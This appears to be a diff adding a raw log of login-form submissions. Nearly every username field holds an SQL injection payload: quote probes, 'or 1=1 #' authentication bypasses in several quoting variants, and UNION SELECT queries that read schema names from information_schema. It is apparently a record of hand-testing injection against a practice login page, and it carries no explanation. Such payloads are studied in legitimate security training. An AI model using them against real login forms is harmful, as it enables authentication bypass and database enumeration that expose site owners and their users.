@@ -1,0 +1,134 @@
+User Name:admin'
+Password:pass
+User Name:
+Password:
+User Name:
+Password:
+User Name:admin
+Password:admin
+User Name:
+Password:
+User Name:admian" union select 1,group_concat(schema_name) from information_schema.schemata #  # 
+Password:123
+User Name:admian" union select 1,group_concat(schema_name) from information_schema.schemata #  # 
+Password:123
+User Name:admian" union select 1,group_concat(schema_name) from information_schema.schemata #  
+Password:123
+User Name:admian" union select 1,group_concat(schema_name) from information_schema.schemata #  
+Password:123
+User Name:admin
+Password:123
+User Name:admin'
+Password:123
+User Name:admin"
+Password:123
+User Name:admin"
+Password:123
+User Name:admian) union select 1,group_concat(schema_name) from information_schema.schemata #  # 
+Password:123
+User Name:admian) union select 1,group_concat(schema_name) from information_schema.schemata #  # 
+Password:123
+User Name:admian) union select 1,group_concat(schema_name) from information_schema.schemata #  # 
+Password:123
+User Name:admian) union select 1,group_concat(schema_name) from information_schema.schemata #  # 
+Password:123
+User Name:admian union select 1,group_concat(schema_name) from information_schema.schemata  # 
+Password:123
+User Name:admian union select 1,group_concat(schema_name) from information_schema.schemata  # 
+Password:123
+User Name:admian union select 1,group_concat(schema_name) from information_schema.schemata  # 
+Password:123
+User Name:admian' # 
+Password:123
+User Name:admian' # 
+Password:123
+User Name:admian) # 
+Password:123
+User Name:admian) # 
+Password:123
+User Name:admian" # 
+Password:123
+User Name:admian" 
+Password:123
+User Name:admian" or 1=1# 
+Password:123
+User Name:admian" or 1=1 # 
+Password:123
+User Name:admian" or 1=1 # 
+Password:123
+User Name:admian" or 1=1 # 
+Password:123
+User Name:admian" or 1=1 # 
+Password:123
+User Name:admian" or 1=1 # 
+Password:123
+User Name:admian" or 1=1 # 
+Password:123
+User Name:admian' or 1=1 # 
+Password:123
+User Name:admian' or 1=1 # 
+Password:123
+User Name:admian' or 1=1 # 
+Password:123
+User Name:admian' or 1=1 # 
+Password:123
+User Name:admian" or 1=1 # 
+Password:123
+User Name:admian") # or 1=1 # 
+Password:123
+User Name:admian" # or 1=1 # 
+Password:123
+User Name:admian) # or 1=1 # 
+Password:123
+User Name:admian) # or 1=1 # 
+Password:123
+User Name:admian) # or 1=1 # 
+Password:123
+User Name:admian) # or 1=1 # 
+Password:123
+User Name:admian) # or 1=1 # 
+Password:123
+User Name:admian) # or 1=1 # 
+Password:123
+User Name:admian) # or 1=1 # 
+Password:123
+User Name:admin)#
+Password:l
+User Name:
+Password:
+User Name:admian") # or 1=1 # 
+Password:123
+User Name:admian") # or 1=1 # 
+Password:123
+User Name:admian") # or 1=1 # 
+Password:123
+User Name:admian")  or 1=1 # 
+Password:123
+User Name:admian")  or 1=1 # 
+Password:123
+User Name:admian")  or 1=1 # 
+Password:123
+User Name:admin")  or 1=1 # 
+Password:123
+User Name:admin")  or 1=1 # 
+Password:123
+User Name:admin")  or 1=1 # 
+Password:123
+User Name:admin")  # 
+Password:123
+User Name:admin")  # 
+Password:123
+User Name:admin"  # 
+Password:123
+User Name:admin"  
+Password:123
+User Name:admin"  # 
+Password:123
+User Name:admin" union select 1,group_concat(schema_name) from information_schema.schemata  # 
+Password:123
+User Name:admin" union select 1,group_concat(schema_name) from information_schema.schemata  # 
+Password:123
+User Name:admin") union select 1,group_concat(schema_name) from information_schema.schemata  # 
+Password:123
+User Name:-1") union select 1,group_concat(schema_name) from information_schema.schemata  # 
+Password:123
